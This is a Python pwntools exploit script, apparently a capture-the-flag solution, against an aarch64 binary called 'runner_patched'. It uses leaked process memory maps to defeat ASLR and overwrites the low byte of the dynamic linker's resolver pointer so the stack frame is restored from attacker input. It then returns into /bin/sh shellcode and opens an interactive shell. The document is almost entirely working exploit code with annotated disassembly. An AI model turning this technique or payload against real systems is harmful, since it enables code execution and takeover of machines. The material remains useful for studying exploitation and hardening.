#!/usr/bin/env python3
from pwn import *

context(terminal=['tmux', 'split-pane', '-vb', '-p80'])
context(os="linux", arch="aarch64")

elf = context.binary = ELF('./runner_patched')
libc = ELF(args.libc) if args.libc else elf.libc
ld = ELF('lib/ld-linux-aarch64.so.1')
host, port = 'somehost', 1337

gs = '\n'.join([
    'set breakpoint pending on',
    'b *0x55018441ac',
])


def start():
  with context.quiet:
    if args.GDB:
      return gdb.debug(elf.path, gdbscript=gs, api=True)
    elif args.REMOTE:
      return remote(host, port)
    else:
      return process(elf.path)

def pause():
  if args.GDB:
    io.gdb.interrupt_and_wait()

io = start()

"""
Rebase exe with leaked proc maps data.
"""
maps_data = io.recvuntil(b"exit").strip()
log.info(f"maps_data: {maps_data.decode()}")
maps = maps_data.split(b'\n')
elf_base = int(maps[0].split(b'-')[0], 16)
elf.address = elf_base

log.info(f"elf_base: {elf_base:#x}")

"""
Calculate known addresses.
- Buffer start is where our input is stored.
- Shellcode start is where our shellcode will be stored.
- ld_resolver_ptr is the address of the ld resolver function pointer 
    (it is stored just before the exit GOT entry).
"""
buffer_start = elf.address + 0x182bdd8
shellcode_start = buffer_start + 0x10
ld_resolver_ptr = elf.got.exit - 8
attack_byte = 0xac # new byte to write over ld_resolver_ptr lsb (padded to 8 bytes to maintain alignment)

log.info(f"Buffer: {buffer_start:#x}")
log.info(f"Shellcode Start: {shellcode_start:#x}")
log.info(f"LD Resolver ptr: {ld_resolver_ptr:#x}")

"""
Send a status code of 1337 (doesnt seem to matter what it is).
"""
io.sendlineafter(b">\n", b"1337")

"""
Send the address of the ld resolver function pointer (elfbase + 0x21258).
    We will overwrite the lsb of this address with 0xac.
    This will skip the register stashing before calling sub_0xff90 and cause it to 
    use some values from our input when reinstating the stack frame.
    Specifically it will allow us to x29 and x30 which are the stack frame
    pointer and the return address respectively.

    ============== resolver function from ld @ 0x12184 ==============
    00012184  int64_t sub_12184(void* arg1 @ x16, int64_t arg2, int64_t arg3)
          0 @ 00012188  sp = sp - 0xd0                      <================== Original target of resolver function pointer. 
          1 @ 00012188  [sp {__saved_x8}].q = x8                                Skipping this causes stack to be 0xd0 bytes higher than intended.
          2 @ 00012188  [sp + 8 {__saved_x9}].q = x9
          3 @ 0001218c  [sp + 0x10 {__saved_x6}].q = x6
          4 @ 0001218c  [sp + 0x18 {__saved_x7}].q = x7
          5 @ 00012190  [sp + 0x20 {__saved_x4}].q = x4
          6 @ 00012190  [sp + 0x28 {__saved_x5}].q = x5
          7 @ 00012194  [sp + 0x30 {__saved_x2}].q = x2
          8 @ 00012194  [sp + 0x38 {__saved_x3}].q = x3
          9 @ 00012198  [sp + 0x40 {__saved_x0}].q = x0
         10 @ 00012198  [sp + 0x48 {__saved_x1}].q = x1
         11 @ 0001219c  [sp + 0x50 {__saved_v0}].o = q0
         12 @ 0001219c  [sp + 0x60 {__saved_v1}].o = q1
         13 @ 000121a0  [sp + 0x70 {__saved_v2}].o = q2
         14 @ 000121a0  [sp + 0x80 {__saved_v3}].o = q3
         15 @ 000121a4  [sp + 0x90 {__saved_v4}].o = q4
         16 @ 000121a4  [sp + 0xa0 {__saved_v5}].o = q5
         17 @ 000121a8  [sp + 0xb0 {__saved_v6}].o = q6
         18 @ 000121a8  [sp + 0xc0 {__saved_v7}].o = q7
         19 @ 000121ac  x0 = [x16 - 8].q                    <================== New target of the ld resolver function pointer after single byte overwrite.
         20 @ 000121b0  x1 = [sp + 0xd0 {arg2}].q
         21 @ 000121b4  x1 = x1 - x16
         22 @ 000121b8  x1 = x1 + (x1 << 1)
         23 @ 000121bc  x1 = x1 << 3
         24 @ 000121c0  x1 = x1 - 0xc0
         25 @ 000121c4  x1 = x1 u>> 3
         26 @ 000121c8  call(sub_ff90)
         27 @ 000121cc  x16 = x0                            <================== When we arrive back here our buffer is at $sp + 0x38.
         28 @ 000121d0  q0 = [sp + 0x50 {__saved_v0}].o
         29 @ 000121d0  q1 = [sp + 0x60 {__saved_v1}].o
         30 @ 000121d4  q2 = [sp + 0x70 {__saved_v2}].o
         31 @ 000121d4  q3 = [sp + 0x80 {__saved_v3}].o
         32 @ 000121d8  q4 = [sp + 0x90 {__saved_v4}].o
         33 @ 000121d8  q5 = [sp + 0xa0 {__saved_v5}].o
         34 @ 000121dc  q6 = [sp + 0xb0 {__saved_v6}].o
         35 @ 000121dc  q7 = [sp + 0xc0 {__saved_v7}].o
         36 @ 000121e0  x0 = [sp + 0x40 {__saved_x0}].q
         37 @ 000121e0  x1 = [sp + 0x48 {__saved_x1}].q
         38 @ 000121e4  x2 = [sp + 0x30 {__saved_x2}].q
         39 @ 000121e4  x3 = [sp + 0x38 {__saved_x3}].q
         40 @ 000121e8  x4 = [sp + 0x20 {__saved_x4}].q
         41 @ 000121e8  x5 = [sp + 0x28 {__saved_x5}].q
         42 @ 000121ec  x6 = [sp + 0x10 {__saved_x6}].q
         43 @ 000121ec  x7 = [sp + 0x18 {__saved_x7}].q
         44 @ 000121f0  x8 = [sp {__saved_x8}].q
         45 @ 000121f0  x9 = [sp + 8 {__saved_x9}].q
         46 @ 000121f0  sp = sp + 0xd0
         47 @ 000121f4  x17 = [sp {arg2}].q
         48 @ 000121f4  x30 = [sp + 8 {arg3}].q
         49 @ 000121f4  sp = sp + 0x10
         50 @ 000121f8  jump(x16)
"""
io.sendlineafter(b">\n", f"{ld_resolver_ptr:08x}".encode())

"""
Clobbered stack values. (0x30 bytes)
These are ultimately overwritten by after calling printf before returning
to our ret addr but since printf uses these we may as well specify something here
to get nicer output and avoid a potential crash.

The actual shellcode gets written to shellcode_start + 0x30 initially.
After printf returns our shellcode will be at shellcode_start.
"""
clobbered = p64(0x13371337) * 4 
clobbered += b"HERES A SHELL: \0"


"""
Just your standard aarch64 shellcode.
"""
shellcode = asm(shellcraft.aarch64.linux.sh())
shellcode += b"\x00" * (0x58 - len(shellcode))

"""
Arrange the payload
"""
payload =  p64(attack_byte)     # $sp + 0x38 - 0x40 Will end up in x3
payload += p64(buffer_start)    # $sp + 0x40 - 0x48 Will end up in x0
payload += clobbered            # $sp + 0x48 - 0x78 Will end up in x1, q0-q2[:8]
payload += shellcode            # $sp + 0x78 - 0xd0 Will end up in x1, q0-q2[8:]
payload += p64(elf.got.printf)  # $sp + 0xd0 - 0xd8 Will end up in x17 
payload += p64(shellcode_start) # $sp + 0xd8 - 0xe0 Will end up in x30 (return address)

io.sendlineafter(b">\n", payload)

io.interactive()
